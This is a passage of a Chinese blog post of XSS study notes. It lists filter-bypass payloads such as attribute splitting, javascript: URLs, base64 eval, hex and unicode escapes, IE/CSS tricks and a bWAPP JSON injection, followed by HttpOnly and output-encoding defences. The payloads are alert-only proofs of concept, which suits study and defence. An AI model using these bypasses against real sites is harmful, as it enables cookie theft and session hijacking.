+<h3 id="9-空格分割属性XSS"><a href="#9-空格分割属性XSS" class="headerlink" title="9.空格分割属性XSS"></a>9.空格分割属性XSS</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">这种情况比较少，但还是存在的，例如：当你输入111 <span class="hljs-attribute">1111</span>=2222时，前面的值会被value所得到，后面就会自成一个属性：value=&quot;111&quot; <span class="hljs-attribute">1111</span>=<span class="hljs-string">&quot;2222&quot;</span><br>payload：111 <span class="hljs-attribute">comouseover</span>=alert(document.cookie);<br></code></pre></td></tr></table></figure>
+
+
+<h3 id="10-javascript伪协议的XSS（碰到超链接可以一试）"><a href="#10-javascript伪协议的XSS（碰到超链接可以一试）" class="headerlink" title="10.javascript伪协议的XSS（碰到超链接可以一试）"></a>10.javascript伪协议的XSS（碰到超链接可以一试）</h3><p>将JavaScript代码添加到客户端的办法就是把它放置在伪协议说明符JavaScript:后的url中。这个特殊的协议类型声明了url的主体是任意的JavaScript，他由JavaScript的解释器运行。如果JavaScript:url中的JavaScript代码含有多个语句，必须使用分好将这些语句分割开。</p>
+<figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs vbnet"><span class="hljs-symbol">javascript:</span>var now = <span class="hljs-built_in">new</span> <span class="hljs-type">Date</span>();<span class="hljs-string">&quot;&lt;h1&gt;The time is:&lt;/h1&gt;&quot;</span>+now;<br>javascript url 还可以含有只执行动作，但不返回值的JavaScript语句<br><span class="hljs-symbol">JavaScript:</span>alert(<span class="hljs-string">&quot;hello world&quot;</span>)<br><br>&lt;a&gt;标签定义超链接，用于从一个页面链接到另一个页面<br>&lt;a&gt;元素最重要的是href属性，它指定链接的目标<br><br></code></pre></td></tr></table></figure>
+<p><img src="/2020/02/17/XSS%E5%AD%A6%E4%B9%A0/%E6%B7%B1%E5%BA%A6%E6%88%AA%E5%9B%BE_%E9%80%89%E6%8B%A9%E5%8C%BA%E5%9F%9F_20200226204629.png" srcset="/img/loading.gif"></p>
+<h3 id="11-绕过过滤domain为空的XSS"><a href="#11-绕过过滤domain为空的XSS" class="headerlink" title="11.绕过过滤domain为空的XSS"></a>11.绕过过滤domain为空的XSS</h3><p>1.双写绕过</p>
+<p>2.编码绕过（base64编码）</p>
+<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="xml">&quot;&gt;<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"><span class="hljs-built_in">eval</span>(atob(<span class="hljs-string">&#x27;YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==&#x27;</span>))</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="xml">atob()函数将base64加密的密文转化为明文</span><br><span class="xml">（YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==）是alert(document.domain)加密的</span><br></code></pre></td></tr></table></figure>
+
+
+<h3 id="12-绕过替换script-on事件的XSS（注意：不是替换为空了）"><a href="#12-绕过替换script-on事件的XSS（注意：不是替换为空了）" class="headerlink" title="12.绕过替换script/on事件的XSS（注意：不是替换为空了）"></a>12.绕过替换script/on事件的XSS（注意：不是替换为空了）</h3><p>1.尝试伪协议绕过（若因为script被替换而导致伪协议无法进行，可在中间添加空格）</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-number">111</span><span class="hljs-string">&quot;&gt;&lt;a href=&quot;</span>javas    crip<span class="hljs-variable">t:alert</span>(document.domain)<span class="hljs-comment">&quot;&gt;xss&lt;/a&gt;</span><br></code></pre></td></tr></table></figure>
+
+
+<h3 id="13-利用IE特性绕过XSS过滤（只有适用IE游览器）"><a href="#13-利用IE特性绕过XSS过滤（只有适用IE游览器）" class="headerlink" title="13.利用IE特性绕过XSS过滤（只有适用IE游览器）"></a>13.利用IE特性绕过XSS过滤（只有适用IE游览器）</h3><p>当过滤了双引号而导致无法闭合时，可以尝试利用IE特性</p>
+<p>IE特性讲解</p>
+<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs typescript">两个反引号（<span class="hljs-string">``</span>）可以闭合左边一个双引号。<br><span class="hljs-string">``</span>onmouseover=alert(<span class="hljs-built_in">document</span>.domain)<br></code></pre></td></tr></table></figure>
+
+
+<h3 id="14-利用CSS特性绕过XSS过滤"><a href="#14-利用CSS特性绕过XSS过滤" class="headerlink" title="14.利用CSS特性绕过XSS过滤"></a>14.利用CSS特性绕过XSS过滤</h3><p>当我们的双引号被特殊转义后，可以使用该方法，但是条件苛刻（目前只有IE游览器可以支持这种攻击）</p>
+<p>CSS特性</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">backgroup</span><span class="hljs-selector-pseudo">:url(&quot;javascript</span><span class="hljs-selector-pseudo">:alert(document.domain)</span>;&quot;)设置背景颜色<br>设置<span class="hljs-selector-tag">background</span><span class="hljs-selector-pseudo">:url</span>，利用<span class="hljs-selector-tag">JavaScript</span>伪协议执行<span class="hljs-selector-tag">js</span>。目前只有<span class="hljs-selector-tag">IE</span>游览器支持<br><br><span class="hljs-selector-tag">payload</span>：<span class="hljs-selector-tag">background-color</span>:<span class="hljs-selector-id">#fOO</span>;<span class="hljs-selector-tag">backgroup</span><span class="hljs-selector-pseudo">:url(&quot;javascript</span><span class="hljs-selector-pseudo">:alert(document.domain)</span>;&quot;);<br></code></pre></td></tr></table></figure>
+
+
+<h3 id="15-十六进制绕过过滤触发XSS"><a href="#15-十六进制绕过过滤触发XSS" class="headerlink" title="15.十六进制绕过过滤触发XSS"></a>15.十六进制绕过过滤触发XSS</h3><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs livescript">Python转换<span class="hljs-number">16</span>进制<br><span class="hljs-keyword">import</span> binascii;<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\\x&quot;</span>+binascii.b2a_hex(s))<br>输出了<span class="hljs-string">\x61</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\\x&quot;</span>+binascii.b2a_hex(<span class="hljs-string">&quot;&lt;&quot;</span>)) <span class="hljs-comment">#其实&lt;的十六进制是3c,加上了\\x是为了转化成js可以识别的十六进制</span><br>输出了<span class="hljs-string">\x3c</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\\x&quot;</span>+binascii.b2a_hex(<span class="hljs-string">&quot;&gt;&quot;</span>))<br>输出了<span class="hljs-string">\x3e</span><br></code></pre></td></tr></table></figure>
+<p>双斜杠+x+十六进制绕过对尖括号的转义(经过测试，在这个靶场会对\x3c中的\去掉，因此<code>\\x3c</code>)</p>
+<figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs properties"><span class="hljs-attr">payload</span>:<span class="hljs-string">\\x3cscript\\x3ealert(document.domain);\\x3c/script\\x3e</span><br></code></pre></td></tr></table></figure>
+
+
+<h3 id="16-unicode绕过过滤XSS（当十六进制-x-双斜杠无法绕过时，可以尝试这方法）"><a href="#16-unicode绕过过滤XSS（当十六进制-x-双斜杠无法绕过时，可以尝试这方法）" class="headerlink" title="16.unicode绕过过滤XSS（当十六进制+x+双斜杠无法绕过时，可以尝试这方法）"></a>16.unicode绕过过滤XSS（当十六进制+x+双斜杠无法绕过时，可以尝试这方法）</h3><p>利用Python将字符转换为Unicode类型</p>
+<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><span class="hljs-keyword">import</span> binascii;<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\\u00&quot;</span>+binascii.b2a_hex(<span class="hljs-string">&quot;&lt;&quot;</span>));<br>输出了<span class="hljs-string">\u003c</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\\u00&quot;</span>+binascii.b2a_hex(<span class="hljs-string">&quot;&gt;&quot;</span>));<br>输出了<span class="hljs-string">\u003e</span><br></code></pre></td></tr></table></figure>
+<p>双斜杠+u00+十六进制绕过对尖括号的过滤</p>
+<figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs properties"><span class="hljs-attr">payload</span>:<span class="hljs-string">\\u003cscript\\u003ealert(document.domain);\\u003c/script\\u003e</span><br></code></pre></td></tr></table></figure>
+
+
+<h3 id="17-游览器的同源策略"><a href="#17-游览器的同源策略" class="headerlink" title="17.游览器的同源策略"></a>17.游览器的同源策略</h3><p>在计算机中源在RFC6454中规定，源由协议、主机名、端口名组成</p>
+<p>范例：协议://主机名:端口号/</p>
+<p>同源策略：在计算中，同源策略（SOP）用于阻止一个非同源的页面恶意代码去访问另外一个非同源页面</p>
+<p>只有两个页面属于同一个源才能互相访问。不同源的客户端脚本在没有明确授权的情况下，不能读写对方资源。所以a.com下的js脚本采用ajax读取b.com里面的文件数据是会报错的</p>
+<p><strong>注意：</strong>同源一定要是协议、主机名、端口名完全一样</p>
+<p>IE源的特殊处理：</p>
+<p>1.位于可信域的互信的域名间，不收同源策略限制</p>
+<p>2.IE判断同源时不考虑端口</p>
+<p>可通过document.domain读取或修改源。但是有限制，修改之后的源不能通过其它脚本再次修改</p>
+<p>document.domain属性可以解决因同源安全策略带来的不同文档的属性共享问题。降域document.domain同源策略认为域和子域属于不同的域，如：</p>
+<p>child1.a.com与a.com</p>
+<p>child1.a.com与child2.a.com</p>
+<p>但是两两不同源，可以通过设置document.domain=’a.com’,游览器就会认为它们都是同一个源。想要实现以上任意两个页面之间的通信，两个页面必须都设置document.domain=’a.com’</p>
+<h3 id="18-cookie的HTTPonly设置"><a href="#18-cookie的HTTPonly设置" class="headerlink" title="18.cookie的HTTPonly设置"></a>18.cookie的HTTPonly设置</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">php中的函数使用：<br>setcookie(<span class="hljs-string">&quot;abc&quot;</span>,<span class="hljs-string">&quot;test&quot;</span>,<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>,<span class="hljs-literal">TRUE</span>);设置secure参数为<span class="hljs-literal">true</span>之后，就不能使用js获取cookie<br></code></pre></td></tr></table></figure>
+
+
+<h3 id="19-XSS-Filter过滤器"><a href="#19-XSS-Filter过滤器" class="headerlink" title="19.XSS_Filter过滤器"></a>19.XSS_Filter过滤器</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">htmlspecialchars</span><span class="hljs-params">()</span></span>函数<br>把预定义的字符净化并转化为HTML实体（就是变成可以显示的字符，不会作为代码运行，而是作为字符输出）<br>预定义字符有：<br>&amp;(和号)成为&amp;<br><span class="hljs-string">&quot;(双引号)成为&quot;</span><br><span class="hljs-string">&#x27;(单引号)成为&#x27;</span><br>&lt; （小于）成为 &lt;<br>&gt; （大于）成为 &gt;<br><br><span class="hljs-function"><span class="hljs-title">htmlentities</span><span class="hljs-params">()</span></span>函数<br>这个函数对于过滤用户输入的数据非常有用。它会将一些特殊字符转化为HTML实体，例如，用户输入&lt;时，就会被该函数转化为HTML实体&lt;(&amp;lt这个是查看源代码才能看到的)，输入&gt;就会被转为实体&gt;(&amp;gt)<br><br><span class="hljs-function"><span class="hljs-title">strip_tags</span><span class="hljs-params">()</span></span>函数<br><span class="hljs-function"><span class="hljs-title">strip_tags</span><span class="hljs-params">()</span></span>函数剥去字符串中的HTML、XML以及php标签<br>注释:该函数始终会剥离HTML注释。这点无法通过allow参数改变<br>注释：该函数是二进制安全的<br><br>自定义XSS Filter<br>根据自己情况，在网上进行搜索，直接使用<br></code></pre></td></tr></table></figure>
+
+
+<h3 id="20-编码转义介绍"><a href="#20-编码转义介绍" class="headerlink" title="20.编码转义介绍"></a>20.编码转义介绍</h3><p>因为游览器对提交的编码进行自解析，执行，从而我们可以利用来绕过XSS绕过来进行触发XSS</p>
+<p>XSS编码：HTML实体编码（10进制、16进制）、进制编码（10进制ascii码、十六进制字符串、Unicode）、url编码、jsfuck、html编码（%0a换行符）</p>
+<h3 id="21-XSS过滤器绕过"><a href="#21-XSS过滤器绕过" class="headerlink" title="21.XSS过滤器绕过"></a>21.XSS过滤器绕过</h3><p>寻找合适的XSS fuzz字典（kali中自带字典/usr/share/wordlist/wfuzz/Injecion/XSS.txt），然后用burp进行暴力尝试</p>
+<h3 id="22-XSS发生的位置"><a href="#22-XSS发生的位置" class="headerlink" title="22.XSS发生的位置"></a>22.XSS发生的位置</h3><p>1.如果在url中提交的参数值，在页面中显示。很有可能就存在XSS（GET型url中的XSS)</p>
+<p>2.如果在表单中提交的参数值，在页面显示。很有可能就存在XSS（POST型的XSS）</p>
+<p>3.JSON是一种轻量级的数据交换格式。易于人阅读和编写，同时也易于机器解析和生成，并有效地提升网络传输效率。json最常用的格式是对象的键值对</p>
+<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs stata">以bwapp靶场中，json的XSS来进行测试<br><br><br>        <span class="hljs-keyword">var</span> JSONResponseString = &#x27;&#123;<span class="hljs-string">&quot;movies&quot;</span>:[&#123;<span class="hljs-string">&quot;response&quot;</span>:<span class="hljs-string">&quot;123??? Sorry, we don&amp;#039;t have that movie :(&quot;</span>&#125;]&#125;&#x27;;<br><br>        <span class="hljs-comment">// var JSONResponse = eval (&quot;(&quot; + JSONResponseString + &quot;)&quot;);</span><br>        <span class="hljs-keyword">var</span> JSONResponse = JSON.<span class="hljs-keyword">parse</span>(JSONResponseString);<br><br>        document.getElementById(<span class="hljs-string">&quot;result&quot;</span>).innerHTML=JSONResponse.movies[0].response;<br><br>    这是通过提交123无害值并查看元素后看到的JavaScript的代码，其中就运用这接送格式，为了进行XSS攻击，我们的进行js格式的闭合<br>    <span class="hljs-string">&quot;&#125;]&#125;&#x27;;alert(&quot;</span>xsstest&quot;);<span class="hljs-comment">//</span><br>    后面不要的代码用<span class="hljs-comment">//进行注释</span><br></code></pre></td></tr></table></figure>
+<p>4.自定义HTTP头中的XSS：如果在HTTP自定义头中提交的参数，在页面显示，也有可能存在XSS漏洞</p>
+<h3 id="23-存储型XSS灰盒测试"><a href="#23-存储型XSS灰盒测试" class="headerlink" title="23.存储型XSS灰盒测试"></a>23.存储型XSS灰盒测试</h3><p>定向XSS挖掘：</p>
+<p>1.XSS可以存在于个人资料处，文章发表处或者留言评论处等；</p>
+<p>2.发现没有被HTML实体化，可以进行下一步操作</p>
+<p>3.黑名单审计，查找没有在黑名单中的标签和事件</p>
+<p>4.绕过过滤，触发XSS</p>
+<h3 id="24-xsser工具利用（kali）"><a href="#24-xsser工具利用（kali）" class="headerlink" title="24.xsser工具利用（kali）"></a>24.xsser工具利用（kali）</h3><h3 id="25-xssfuzz工具xsstr"><a href="#25-xssfuzz工具xsstr" class="headerlink" title="25.xssfuzz工具xsstr"></a>25.xssfuzz工具xsstr</h3><h2 id="XSS的防御"><a href="#XSS的防御" class="headerlink" title="XSS的防御"></a>XSS的防御</h2><h3 id="1-HttpOnly-可以减少cookie被盗的影响"><a href="#1-HttpOnly-可以减少cookie被盗的影响" class="headerlink" title="1.HttpOnly(可以减少cookie被盗的影响)"></a>1.HttpOnly(可以减少cookie被盗的影响)</h3><p>一个Cookie的使用过程如下：</p>
+<p>Step1: 游览器向服务器发送请求，这时候没有Cookie。</p>
+<p>Step2:服务器返回时发送Set-Cookie头，向客户端写入Cookie。</p>
+<p>Step3:在该Cookie到期前，游览器访问该域下的所有页面，都将发送该Cookie。</p>
+<p>HttpOnly是在Set-Cookied的时候标记的。</p>
+<p>服务器有可能会设置多个cookie，我们可以有选择的将HttpOnly标记在一些关键Cookie上，比如身份认证的。</p>
+<p>php:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    setcookie(<span class="hljs-string">&quot;abc&quot;</span>,<span class="hljs-string">&quot;test&quot;</span>,<span class="hljs-literal">NULL</span>,<span class="hljs-literal">NULL</span>,<span class="hljs-literal">NULL</span>,<span class="hljs-literal">NULL</span>,<span class="hljs-literal">true</span>);<br><br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure>
+<p>JAVA EE</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">response.setHeader(<span class="hljs-string">&quot;Set-Cookie&quot;</span>,<span class="hljs-string">&quot;cookiename=value;Path=/; Domain=domainvalue;Max-Age=seconds;HttpOnly&quot;</span>)<br></code></pre></td></tr></table></figure>
+
+
+<h3 id="2-Xss-Filter（输入检查）"><a href="#2-Xss-Filter（输入检查）" class="headerlink" title="2.Xss Filter（输入检查）"></a>2.Xss Filter（输入检查）</h3><p>并不提倡，因为有时候会将用户的输入误杀</p>
+<h3 id="3-输出检查"><a href="#3-输出检查" class="headerlink" title="3.输出检查"></a>3.输出检查</h3><p>一般来说，除了富文本的输出外，在变量输出到HTML页面时，可以使用编码或转义的方式来防御。</p>
+<h3 id="4-安全的编码函数（极力推崇）"><a href="#4-安全的编码函数（极力推崇）" class="headerlink" title="4.安全的编码函数（极力推崇）"></a>4.安全的编码函数（极力推崇）</h3><p>XSS的本质是”HTML注入”，用户的数据被当成HTML代码一部分来执行，从而混淆了原本的语义，产生了新的语义。</p>
+<p>因此我们想根治XSS，从它在输出点，在特定的情况下，使用特定有利的编码函数解决。</p>
+<h4 id="1-在HTML标签中输出"><a href="#1-在HTML标签中输出" class="headerlink" title="1.在HTML标签中输出"></a>1.在HTML标签中输出</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span><br>    $var<br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">#</span>&gt;</span>$var<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></td></tr></table></figure>
+<p>所有像这种在标签中输出的变量，如果未作任何处理，都能导致直接产生Xss</p>
+<p><strong>防御方法：是对变量使用HtmlEncode</strong></p>
+<h4 id="2-在HTML属性中输出"><a href="#2-在HTML属性中输出" class="headerlink" title="2.在HTML属性中输出"></a>2.在HTML属性中输出</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">&lt;div id = &quot;abc&quot; name = &quot;$var&quot;&lt;/div&gt;<br></code></pre></td></tr></table></figure>
+<p><strong>防御方法：也是采用HtmlEncode</strong></p>
+<p>例如：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">String safe = ESAPI.encoder().encodeForHTMLAttribute(request.getParameter(<span class="hljs-string">&quot;input&quot;</span>));<br></code></pre></td></tr></table></figure>
+<h3 id="3-在-lt-script-gt-标签中输出"><a href="#3-在-lt-script-gt-标签中输出" class="headerlink" title="3.在&lt;script&gt;标签中输出"></a>3.在<code>&lt;script&gt;</code>标签中输出</h3><p>在<code>&lt;script&gt;</code>标签中输出，首先应该确保输出的变量在引号中。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script&gt;<br>    <span class="hljs-keyword">var</span>= <span class="hljs-string">&quot;$var&quot;</span>;<br>    &lt;/script&gt;<br></code></pre></td></tr></table></figure>
+<p>这样子攻击者需要先闭合引号才能实施攻击。</p>
+<p>这是再加上<strong>JavascriptEncode</strong></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/web%E5%AE%89%E5%85%A8/">web安全</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">学习笔记</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2020/02/18/Windows%E5%9F%BA%E7%A1%80/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Windows基础</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2020/02/10/python%E5%AD%A6%E4%B9%A0-%E6%95%99%E5%8A%A1%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E6%88%90%E7%BB%A9%E7%88%AC%E5%8F%96/">
+                        <span class="hidden-mobile">python学习-教务管理系统成绩爬取</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+              <!-- Comments -->
+              <article class="comments" id="comments">
+                
+                
+  <div id="vcomments"></div>
+  <script type="text/javascript">
+    Fluid.utils.waitElementVisible('vcomments', function() {
+      Fluid.utils.createScript('https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', function () {
+        new Valine({
+          el: "#vcomments",
+          app_id: "r1aoO2CU8pztHBXDkQYFikuI-gzGzoHsz",
+          app_key: "dJhm8HsnHbHaA1BVeojBc6MI",
+          placeholder: "Just go go",
+          path: window.location.pathname,
+          avatar: "mm",
+          meta: ["nick","mail","link"],
+          pageSize: "10",
+          lang: "zh-CN",
+          highlight: false,
+          recordIP: false,
+          serverURLs: "",
+        });
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the
+    <a target="_blank" href="https://valine.js.org" rel="nofollow noopener noopener">comments powered by Valine.</a>
+  </noscript>
+
+
+              </article>
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- 不蒜子统计PV -->
+        <span id="busuanzi_container_site_pv" style="display: none">
+            总访问量 
+            <span id="busuanzi_value_site_pv"></span>
+             次
+          </span>
+      
+      
+        <!-- 不蒜子统计UV -->
+        <span id="busuanzi_container_site_uv" style="display: none">
+            总访客数 
+            <span id="busuanzi_value_site_uv"></span>
+             人
+          </span>
+      
+    
+  </div>
+
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.0/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js" ></script>
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+
+</body>
+</html>
